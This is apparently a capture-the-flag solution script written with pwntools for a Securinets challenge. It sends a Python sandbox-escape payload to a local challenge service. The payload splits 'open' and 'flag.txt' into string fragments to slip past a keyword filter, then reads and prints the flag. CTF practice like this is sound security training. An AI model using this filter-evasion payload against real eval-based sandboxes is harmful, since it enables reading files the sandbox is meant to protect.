#!/usr/bin/env python3

from pwn import *


context.log_level = "error"

p = process(["python3", "-u", "chall.py"]) if args.LOCAL else remote("127.0.0.1", 9042)

payload = b"getattr(__builtins__,''.join(['o','p','e','n']))(''.join(['fl','ag.txt'])).read()"
p.sendlineafter(b"> ", payload)

p.recvuntil(b"Securinets{")
flag = b"Securinets{" + p.recvuntil(b"}")
print(flag.decode())
p.close()
